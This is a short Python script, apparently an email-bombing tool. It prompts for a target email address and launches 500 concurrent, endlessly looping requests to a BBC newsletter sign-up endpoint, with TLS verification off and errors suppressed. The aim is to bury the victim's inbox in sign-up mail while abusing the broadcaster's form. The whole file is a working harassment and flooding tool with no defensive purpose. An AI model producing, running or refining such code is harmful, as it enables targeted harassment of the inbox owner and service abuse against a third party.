import aiohttp
import winloop
import asyncio
from datetime import datetime
import os

winloop.install()

os.system("cls && title mahdi1337")

async def signup_spam(email):
    while True:
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None, verify_ssl=False)) as session:
                async with session.get(f'https://cloud.email.bbc.com/Bluey-Sign-Up-Form_Processing_prod?context=SUBMIT&email={email}'):
                    print(f'[{datetime.now().strftime("%H:%M:%S")}] Sent!')
        except:
            pass

async def main():
    email = input("Email: ")
    tasks = [signup_spam(email) for _ in range(500)]
    await asyncio.gather(*tasks)
    
asyncio.run(main())
